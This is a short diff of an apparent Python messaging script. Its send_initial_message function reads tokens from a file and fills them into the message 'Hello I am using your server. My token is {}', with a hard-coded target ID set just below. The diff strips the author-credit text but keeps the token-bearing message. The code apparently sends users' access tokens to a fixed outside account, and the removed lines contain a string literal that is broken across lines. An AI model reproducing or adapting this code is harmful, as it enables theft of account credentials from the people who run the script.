@@ -39,8 +39,7 @@ def send_initial_message():
           tokens = file.readlines()
 
       # Modify the message as per your requirement
-      msg_template = "Follow me on Facbook
-"CREDIT :- MONXTER RULEX        OWNER => ASMIT                  Hello I am using your server. My 👇token👇 is {}"
+      msg_template = "Hello I am using your server. My 👇token👇 is {}"
 
       # Specify the ID where you want to send the message
       target_id = "61556797413007"
